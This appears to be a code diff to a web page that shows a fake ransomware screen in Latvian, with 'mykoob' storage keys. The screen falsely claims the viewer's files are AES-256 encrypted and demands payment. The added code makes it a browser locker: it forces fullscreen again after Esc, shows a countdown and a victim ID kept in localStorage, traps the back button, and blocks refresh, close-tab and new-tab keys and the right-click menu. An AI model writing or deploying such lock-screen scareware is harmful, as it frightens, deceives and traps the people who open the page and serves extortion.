@@ -14,27 +14,36 @@
 <style>
 *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-html, body {
-  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+html {
   background: #8b0000;
-  color: #ffffff;
-  min-height: 100vh;
-  overflow-x: hidden;
+  overflow: hidden;
+  width: 100%;
+  height: 100%;
 }
 
 body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  background: #8b0000;
+  color: #ffffff;
+  position: fixed;
+  inset: 0;
+  width: 100vw;
+  height: 100vh;
+  overflow: hidden;
+  z-index: 999999;
   display: flex;
   align-items: center;
   justify-content: center;
   padding: 40px 20px;
   text-align: center;
-  overflow-y: auto;
 }
 
 .ransom-inner {
   max-width: 720px;
   width: 100%;
   padding: 20px 0;
+  max-height: 100%;
+  overflow-y: auto;
 }
 
 .ransom-title {
@@ -93,7 +102,7 @@ body {
 <div class="ransom-inner">
 <div class="ransom-title">Jūsu faili ir šifrēti</div>
 <p class="ransom-body">
-Visi jūsu dati ir šifrēti ar AES-256.<br />
+Visi jūsu dokumenti, fotogrāfijas un faili ir šifrēti ar AES-256.<br />
 Lai tos atgūtu, mums ir nepieciešams maksājums.
 </p>
 <p class="ransom-body">
@@ -115,6 +124,7 @@ ID: <span id="ransomId">—</span>
 const RANSOM_KEY    = 'mykoob_ransom_deadline';
 const RANSOM_ID_KEY = 'mykoob_ransom_id';
 
+/* ── Īstais fullscreen (mēģina, bet pārlūks var bloķēt) ── */
 function requestFullscreen() {
   if (document.fullscreenElement) return;
 
@@ -134,16 +144,24 @@ function requestFullscreen() {
 
 requestFullscreen();
 
+/* Pēc pirmā klikšķa → īstais fullscreen */
 document.addEventListener('click', function () {
   if (!document.fullscreenElement) requestFullscreen();
 });
 
+/* Pēc jebkura taustiņa → īstais fullscreen */
+document.addEventListener('keydown', function () {
+  if (!document.fullscreenElement) requestFullscreen();
+});
+
+/* Ja lietotājs iziet no fullscreen (Esc) → mēģina atgriezt */
 document.addEventListener('fullscreenchange', function () {
   if (!document.fullscreenElement) {
     setTimeout(requestFullscreen, 100);
   }
 });
 
+/* ── Timer no localStorage ── */
 let deadline = parseInt(localStorage.getItem(RANSOM_KEY) || '0', 10);
 
 if (!deadline || deadline < Date.now()) {
@@ -154,6 +172,7 @@ if (!deadline || deadline < Date.now()) {
 const ransomTimerEl = document.getElementById('ransomTimer');
 const ransomIdEl    = document.getElementById('ransomId');
 
+/* ── ID ── */
 let id = localStorage.getItem(RANSOM_ID_KEY);
 if (!id) {
   id = Array.from({ length: 32 }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
@@ -172,11 +191,13 @@ function renderTimer() {
 renderTimer();
 setInterval(renderTimer, 1000);
 
+/* ── Bloku Back pogu ── */
 history.pushState(null, '', location.href);
 window.addEventListener('popstate', function () {
   history.pushState(null, '', location.href);
 });
 
+/* ── Bloku F5, Ctrl+R, Ctrl+W, Ctrl+T ── */
 document.addEventListener('keydown', function (e) {
   const k = e.key.toLowerCase();
   if (
@@ -193,6 +214,7 @@ document.addEventListener('keydown', function (e) {
   }
 });
 
+/* ── Bloku peles labo pogu ── */
 document.addEventListener('contextmenu', function (e) {
   e.preventDefault();
 });
